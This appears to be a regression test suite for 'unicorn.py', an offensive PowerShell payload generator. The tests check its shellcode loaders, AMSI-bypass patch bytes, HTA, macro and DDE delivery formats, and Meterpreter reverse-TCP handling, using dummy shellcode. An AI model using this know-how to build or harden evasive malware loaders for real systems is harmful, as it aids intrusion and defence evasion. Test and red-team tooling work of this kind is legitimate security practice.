import contextlib
import hashlib
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
UNICORN_PATH = ROOT / "unicorn.py"


class UnicornRegressionTests(unittest.TestCase):
    def run_unicorn(self, work_dir, *args):
        result = subprocess.run(
            [sys.executable, str(UNICORN_PATH), *args],
            cwd=work_dir,
            env={**os.environ, "TERM": "dumb"},
            text=True,
            capture_output=True,
            input="\n",
            timeout=10,
            check=False,
        )

        self.assertEqual(result.returncode, 0, result.stderr + result.stdout[-1000:])
        return result

    def test_unicorn_compiles_without_syntax_warnings(self):
        command = [
            sys.executable,
            "-W",
            "always::SyntaxWarning",
            "-c",
            (
                "source = open('unicorn.py', encoding='utf-8').read();"
                "compile(source, 'unicorn.py', 'exec')"
            ),
        ]

        result = subprocess.run(
            command,
            cwd=ROOT,
            text=True,
            capture_output=True,
            check=False,
        )

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("SyntaxWarning", result.stderr)

    def test_shellcode_generation_does_not_replace_add_type_result(self):
        sys.dont_write_bytecode = True
        original_argv = sys.argv[:]
        sys.argv = ["unicorn.py"]
        try:
            spec = importlib.util.spec_from_file_location("unicorn_under_test", UNICORN_PATH)
            module = importlib.util.module_from_spec(spec)
            with contextlib.redirect_stdout(io.StringIO()):
                spec.loader.exec_module(module)
                powershell_code = module.gen_shellcode_attack(
                    "0xfc,0xe8",
                    "cobaltstrike",
                    "cobaltstrike",
                )
        finally:
            sys.argv = original_argv

        self.assertIn("Add-Type -pass -m", powershell_code)
        self.assertIsNone(
            re.search(r"Add-Type[^;]+;(\$[A-Za-z]{2})=\1\.replace\(", powershell_code),
            powershell_code,
        )

    def test_cert_attack_writes_plain_base64_certificate(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "sample.bin").write_bytes(b"abc123")

            self.run_unicorn(work_path, "sample.bin", "crt")

            certificate = work_path / "decode_attack" / "encoded_attack.crt"
            self.assertEqual(
                certificate.read_text(),
                "-----BEGIN CERTIFICATE-----\nYWJjMTIz\n-----END CERTIFICATE-----",
            )

    def test_invalid_missing_arguments_exit_nonzero(self):
        with tempfile.TemporaryDirectory() as work_dir:
            result = subprocess.run(
                [sys.executable, str(UNICORN_PATH), "windows/meterpreter/reverse_tcp"],
                cwd=work_dir,
                env={**os.environ, "TERM": "dumb"},
                text=True,
                capture_output=True,
                timeout=10,
                check=False,
            )

            self.assertNotEqual(result.returncode, 0)
            self.assertIn("right syntax", result.stdout)

    def test_shellcode_hta_modifier_generates_only_hta_attack(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")

            self.run_unicorn(work_path, "shellcode.txt", "shellcode", "hta")

            self.assertTrue((work_path / "hta_attack" / "Launcher.hta").is_file())
            self.assertTrue((work_path / "hta_attack" / "index.html").is_file())
            self.assertFalse((work_path / "powershell_attack.txt").exists())

    def test_shellcode_ms_modifier_generates_settingcontent_attack(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            shutil.copytree(ROOT / "templates", work_path / "templates")
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")

            self.run_unicorn(work_path, "shellcode.txt", "shellcode", "ms")

            self.assertTrue((work_path / "hta_attack" / "Launcher.hta").is_file())
            self.assertTrue((work_path / "hta_attack" / "index.html").is_file())
            self.assertTrue(
                (work_path / "hta_attack" / "Standalone_NoASR.SettingContent-ms").is_file()
            )

    def load_module(self, argv):
        sys.dont_write_bytecode = True
        original_argv = sys.argv[:]
        sys.argv = argv
        try:
            spec = importlib.util.spec_from_file_location("unicorn_under_test", UNICORN_PATH)
            module = importlib.util.module_from_spec(spec)
            with contextlib.redirect_stdout(io.StringIO()):
                spec.loader.exec_module(module)
        finally:
            sys.argv = original_argv
        return module

    def decode_last_payload(self, powershell_attack):
        lines = [l for l in powershell_attack.split("\n") if l.startswith("powershell")]
        import base64
        encoded = re.search(r"-e ([A-Za-z0-9+/=]+)", lines[-1])
        self.assertIsNotNone(encoded, lines[-1][:400])
        return base64.b64decode(encoded.group(1)).decode("utf-16-le")

    def test_hta_attack_is_valid_jscript_with_amsi_bypass(self):
        # with AMSI_BYPASS=ON (the default) the attack contains comment lines and
        # two powershell commands - these used to be embedded raw into the HTA,
        # producing broken JScript (.run(# AMSI bypass code ... <newlines>)).
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")

            self.run_unicorn(work_path, "shellcode.txt", "shellcode", "hta")

            launcher = (work_path / "hta_attack" / "Launcher.hta").read_text()
            self.assertNotIn("# AMSI bypass", launcher)
            self.assertNotIn("actual unicorn payload", launcher)
            self.assertIn(r"C:\\Windows", launcher)
            # one run() call: AMSI bypass and payload share one child process
            self.assertEqual(launcher.count(".run("), 1, launcher)
            self.assertTrue(launcher.rstrip().endswith("</script>"))

            # every run() call must be a single complete line - a raw newline
            # inside the JScript string literal is a syntax error
            for line in launcher.split("\n"):
                if ".run(" in line:
                    self.assertRegex(line, r"\.run\(.*', 0\);$")

            script = re.search(r"<script>(.*)</script>", launcher, re.S).group(1)
            node = shutil.which("node")
            if node:
                check_js = work_path / "check.js"
                check_js.write_text(script)
                result = subprocess.run(
                    [node, "--check", str(check_js)],
                    text=True, capture_output=True, check=False,
                )
                self.assertEqual(result.returncode, 0, result.stderr)

    def test_custom_shellcode_metasploit_format_is_chunked(self):
        # metasploit-format shellcode (\xfc continuous hex, documented as
        # supported) used to be embedded verbatim, so the runtime Split(",")
        # produced a single element that fails the [byte] conversion.
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "msf_shellcode.txt").write_text(
                'unsigned char buf[] = \n'
                '"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89"\n'
                '"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28";'
            )

            self.run_unicorn(work_path, "msf_shellcode.txt", "shellcode")

            decoded = self.decode_last_payload(
                (work_path / "powershell_attack.txt").read_text()
            )
            match = re.search(r'\$[A-Za-z]+="([^"]+)";', decoded)
            self.assertIsNotNone(match, decoded[:400])
            shellcode_literal = match.group(1)
            self.assertNotIn("\\x", shellcode_literal)
            # the byte prefix marker is randomized, but bytes must stay comma separated
            marker = re.escape(shellcode_literal[0])
            self.assertRegex(shellcode_literal, r"^({0}..,)+{0}..$".format(marker))
            self.assertIn('.replace("{0}", "0x")'.format(shellcode_literal[0]), decoded)
            self.assertEqual(shellcode_literal.count(","), 16)

    def test_cmd_profile_rejects_oversized_inline_amsi_payload(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            shellcode = work_path / "shellcode.txt"
            shellcode.write_text(",".join(["0x00"] * 384))

            result = subprocess.run(
                [
                    sys.executable,
                    str(UNICORN_PATH),
                    str(shellcode),
                    "shellcode",
                    "--amsi",
                    "inline",
                    "--profile",
                    "cmd",
                ],
                cwd=work_path,
                env={**os.environ, "TERM": "dumb"},
                text=True,
                capture_output=True,
                timeout=10,
                check=False,
            )

            self.assertNotEqual(result.returncode, 0)
            self.assertIn("above the 8191 character limit", result.stdout)
            self.assertFalse((work_path / "powershell_attack.txt").exists())

    def test_inline_amsi_and_loader_share_one_child_process(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")

            self.run_unicorn(
                work_path,
                "shellcode.txt",
                "shellcode",
                "--amsi",
                "inline",
                "--profile",
                "cmd",
            )

            attack = (work_path / "powershell_attack.txt").read_text()
            commands = [line for line in attack.splitlines() if line.startswith("powershell")]
            self.assertEqual(len(commands), 1)
            encoded = re.search(r"-e ([A-Za-z0-9+/=]+)", commands[0])
            self.assertIsNotNone(encoded, commands[0][:400])

            import base64
            child = base64.b64decode(encoded.group(1)).decode("utf-16-le")
            self.assertEqual(child.count("Add-Type"), 2)
            self.assertIn("calloc", child)
            self.assertIn("VirtualProtect", child)
            self.assertIn("CreateThread", child)

    def test_allocation_size_follows_shellcode_length(self):
        module = self.load_module(["unicorn.py"])
        shellcode = ",".join(["0x00"] * 4097)

        with contextlib.redirect_stdout(io.StringIO()):
            loader = module.gen_shellcode_attack(shellcode, "cobaltstrike", "cobaltstrike")

        self.assertIn("0x1001", loader)
        self.assertRegex(
            loader,
            r"\$[A-Za-z]+=0x1001;\$[A-Za-z]+=\$[A-Za-z]+::calloc\(\$[A-Za-z]+, 1\)",
        )
        self.assertRegex(loader, r"\$[A-Za-z]+=\[IntPtr\]::Zero;")
        self.assertRegex(loader, r"\[Ref\]\$[A-Za-z]+\);")

    def test_manifest_records_architecture_seed_and_shellcode_hash(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")

            self.run_unicorn(
                work_path,
                "shellcode.txt",
                "shellcode",
                "--amsi",
                "off",
                "--arch",
                "x64",
                "--profile",
                "cmd",
                "--seed",
                "test-seed",
            )

            attack = (work_path / "powershell_attack.txt").read_text()
            manifest = json.loads((work_path / "unicorn_manifest.json").read_text())
            self.assertIn(r"C:\Windows\System32\WindowsPowerShell", attack)
            self.assertEqual(manifest["variant"]["architecture"], "x64")
            self.assertEqual(manifest["variant"]["amsi_mode"], "off")
            self.assertEqual(manifest["variant"]["seed"], "test-seed")
            self.assertEqual(manifest["shellcode"]["bytes"], 4)
            self.assertEqual(
                manifest["shellcode"]["sha256"],
                hashlib.sha256(bytes([0xFC, 0xE8, 0x82, 0x00])).hexdigest(),
            )
            self.assertIn("calloc", manifest["apis"])
            self.assertIn("VirtualProtect", manifest["apis"])
            self.assertIn("CreateThread", manifest["apis"])
            self.assertTrue(
                "memset" in manifest["apis"] or "Marshal.Copy" in manifest["apis"]
            )
            self.assertTrue(manifest["delivery"]["within_limit"])

    def test_seed_reproduces_generated_variant(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")
            command = (
                "shellcode.txt",
                "shellcode",
                "--amsi",
                "off",
                "--profile",
                "cmd",
                "--seed",
                "stable-seed",
            )

            self.run_unicorn(work_path, *command)
            first = (work_path / "powershell_attack.txt").read_text()
            first_manifest = (work_path / "unicorn_manifest.json").read_text()
            (work_path / "powershell_attack.txt").unlink()
            (work_path / "unicorn_manifest.json").unlink()

            self.run_unicorn(work_path, *command)
            second = (work_path / "powershell_attack.txt").read_text()
            second_manifest = (work_path / "unicorn_manifest.json").read_text()

            self.assertEqual(first, second)
            self.assertEqual(first_manifest, second_manifest)

    def test_macro_round_trips_the_generated_command(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)
            (work_path / "shellcode.txt").write_text("0xfc,0xe8,0x82,0x00")
            command = (
                "shellcode.txt",
                "shellcode",
                "--amsi",
                "off",
                "--profile",
                "cmd",
                "--seed",
                "macro-seed",
            )

            self.run_unicorn(work_path, *command)
            expected = (work_path / "powershell_attack.txt").read_text().strip()
            self.run_unicorn(work_path, *command, "macro")
            macro = (work_path / "powershell_attack.txt").read_text()

            variable = re.search(r"^Dim ([A-Za-z0-9_]+)$", macro, re.M).group(1)
            chunks = re.findall(
                rf"^{variable} = (?:{variable} \+ )?\"(.*)\"$",
                macro,
                re.M,
            )
            self.assertTrue(chunks)
            reconstructed = "".join(chunks).replace('""', '"')
            self.assertEqual(reconstructed, expected)
            self.assertRegex(macro, rf"\.Run {variable}, 0, False")

    def test_loader_variants_use_correct_imports(self):
        module = self.load_module(["unicorn.py"])
        shellcode = "0xfc,0xe8,0x82,0x00"

        with contextlib.redirect_stdout(io.StringIO()):
            memset_loader = module.gen_shellcode_attack(
                shellcode,
                "cobaltstrike",
                "cobaltstrike",
                copy_mode="memset",
            )
            marshal_loader = module.gen_shellcode_attack(
                shellcode,
                "cobaltstrike",
                "cobaltstrike",
                copy_mode="marshal",
            )

        self.assertIn("memset", memset_loader)
        normalized_import = re.sub(r'"\+"', "", memset_loader).replace('"', "")
        self.assertRegex(
            normalized_import,
            r"\[DllImport\(msvcrt\.dll\)\]public static extern IntPtr memset",
        )
        self.assertNotIn("memset", marshal_loader)
        self.assertIn("Marshal]::Copy", marshal_loader)
        for loader in (memset_loader, marshal_loader):
            self.assertRegex(loader, r'-Name "U[A-Za-z]+" -names "U[A-Za-z]+"')

            shellcode_match = re.search(r'\$[A-Za-z]+="([^"]+)"', loader)
            self.assertIsNotNone(shellcode_match, loader[:400])
            encoded_shellcode = shellcode_match.group(1)
            shellcode_marker = encoded_shellcode[0]
            round_trip = bytes(
                int(value, 16)
                for value in encoded_shellcode.replace(shellcode_marker, "0x").split(",")
            )
            self.assertEqual(round_trip, bytes([0xFC, 0xE8, 0x82, 0x00]))

    def test_amsi_patch_round_trips_to_expected_bytes(self):
        module = self.load_module(["unicorn.py"])
        module.set_generator_seed("amsi-bytes")

        amsi = module.build_amsi_bypass()
        match = re.search(
            r'\$[A-Za-z]+ = \("(.+?)"\)\.replace\("([^"]+)", "57"\)'
            r'\.replace\("([^"]+)", "0"\)\.replace\("B8([^"]+)", "B8"\);',
            amsi,
        )
        self.assertIsNotNone(match, amsi)

        decoded = (
            match.group(1)
            .replace(match.group(2), "57")
            .replace(match.group(3), "0")
            .replace("B8" + match.group(4), "B8")
        )
        self.assertEqual(
            [int(value, 16) for value in decoded.split(",")],
            [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],
        )

    def test_dde_download_ps1_not_corrupted_by_amsi_wrapper(self):
        # the dde path used to strip the first 11 characters assuming a
        # "powershell " prefix; with the AMSI wrapper that chopped the comment
        # line and left a broken first line ("ss code - run in same ...").
        module = self.load_module(["unicorn.py"])
        module.generate_shellcode = lambda *args: "0xfc,0xe8,0x82,0x00"
        original_cwd = os.getcwd()
        with tempfile.TemporaryDirectory() as work_dir:
            try:
                os.chdir(work_dir)
                with contextlib.redirect_stdout(io.StringIO()):
                    ps = module.gen_shellcode_attack(
                        "windows/meterpreter/reverse_tcp", "192.168.1.5", "443"
                    )
                    # ipaddr is a module level global in real usage
                    module.ipaddr = "192.168.1.5"
                    module.format_payload(ps, "msf", "dde", None)
            finally:
                os.chdir(original_cwd)

            download_ps1 = (Path(work_dir) / "download.ps1").read_text()
            for line in download_ps1.split("\n"):
                if line.strip():
                    self.assertTrue(
                        line.startswith("#") or line.startswith("powershell "),
                        line[:120],
                    )
            self.assertIn("powershell /w 1 /C", download_ps1)
            manifest = json.loads((Path(work_dir) / "unicorn_manifest.json").read_text())
            self.assertEqual(
                manifest["command"]["encoded_child_sha256"],
                hashlib.sha256(download_ps1.encode("utf-8")).hexdigest(),
            )

    def test_error_paths_exit_nonzero(self):
        with tempfile.TemporaryDirectory() as work_dir:
            work_path = Path(work_dir)

            def run(*args):
                return subprocess.run(
                    [sys.executable, str(UNICORN_PATH), *args],
                    cwd=work_dir,
                    env={**os.environ, "TERM": "dumb"},
                    text=True,
                    capture_output=True,
                    input="\n",
                    timeout=10,
                    check=False,
                )

            # missing input file for cert attack
            self.assertNotEqual(run("missing.exe", "crt").returncode, 0)
            # missing input file for cobalt strike
            self.assertNotEqual(run("missing.cs", "cs").returncode, 0)
            # malformed cobalt strike file (has commas but not the C# format)
            (work_path / "bad.cs").write_text("0xfc,0xe8")
            self.assertNotEqual(run("bad.cs", "cs").returncode, 0)
            # empty shellcode file
            (work_path / "empty.txt").write_text("")
            self.assertNotEqual(run("empty.txt", "shellcode").returncode, 0)


if __name__ == "__main__":
    unittest.main()
